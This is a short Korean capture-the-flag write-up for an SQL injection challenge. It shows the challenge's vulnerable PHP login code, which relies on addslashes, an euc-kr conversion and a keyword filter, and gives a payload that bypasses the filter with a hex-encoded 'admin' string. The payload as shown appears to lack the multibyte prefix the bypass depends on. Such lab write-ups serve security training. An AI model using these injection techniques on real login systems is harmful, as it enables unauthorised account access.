# 문제

- 소스

  ```php
  <?php
    include "../../config.php";
    if($_GET['view_source']) view_source();
  ?><html>
  <head>
  <title>Challenge 45</title>
  </head>
  <body>
  <h1>SQL INJECTION</h1>
  <form method=get>
  id : <input name=id value=guest><br>
  pw : <input name=pw value=guest><br>
  <input type=submit>
  </form>
  <hr><a href=./?view_source=1>view-source</a><hr>
  <?php
    if($_GET['id'] && $_GET['pw']){
      $db = dbconnect();
      $_GET['id'] = addslashes($_GET['id']);
      $_GET['pw'] = addslashes($_GET['pw']);
      $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
      if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['id'])) exit();
      if(preg_match("/admin|select|limit|pw|=|<|>/i",$_GET['pw'])) exit();
      $result = mysqli_fetch_array(mysqli_query($db,"select id from chall45 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
      if($result){
        echo "hi {$result['id']}";
        if($result['id'] == "admin") solve(45);
      }
      else echo("Wrong");
    }
  ?>
  </body>
  </html>
  ```
  
- id, pw를 입력받는다.

- addslashes 가 되어있고, 멀티바이트 인코딩 된다.

- admin 일 경우 클리어




#  풀이

- 필터가 되는것을 피해서 id 가 admin인 계정으로 로그인시키면 된다.
- `123'||id like 0x61646d696e`
- 점수 배점이 잘못된것 같다...
- 끝




# 알게된 것

